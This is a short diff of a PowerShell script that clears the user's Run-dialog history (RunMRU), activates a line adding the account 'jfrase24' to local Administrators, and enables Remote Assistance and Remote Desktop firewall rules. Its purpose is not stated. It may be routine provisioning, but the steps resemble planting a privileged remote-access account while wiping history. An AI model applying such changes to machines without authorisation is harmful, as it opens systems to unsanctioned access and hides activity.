@@ -1,5 +1,5 @@
 Remove-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -Recurse
-#Add-LocalGroupMember -Group "Administrators" -Member "jfrase24"
+Add-LocalGroupMember -Group "Administrators" -Member "jfrase24"
 Enable-NetFirewallRule -Name "RemoteAssistance-DCOM-In-TCP-NoScope-Active"
 Enable-NetFirewallRule -Name "RemoteDesktop-Shadow-In-TCP"
 Enable-NetFirewallRule -Name "RemoteDesktop-UserMode-In-TCP"
